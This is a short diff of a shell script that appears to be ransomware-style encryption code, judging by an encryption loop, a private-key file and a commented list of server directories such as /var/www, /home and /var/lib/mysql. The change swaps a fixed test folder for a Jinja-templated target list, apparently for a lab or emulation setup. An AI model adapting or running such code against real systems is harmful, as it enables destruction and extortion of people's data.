@@ -120,6 +120,7 @@ pck() {
 	fi
     fi
 }
+
 enc_loop() {
     kills="$1"
     for i in $kills; do
@@ -163,7 +164,7 @@ main() {
     trap '' TERM
     SOFT="YES"
     init
-    targets="/root/Desktop/testing"
+    targets="{{ targets|join(' ') }}" # Get the target list from jinja
     #targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
     enc_loop "$targets"
     echo >> $PRIVATEKEY
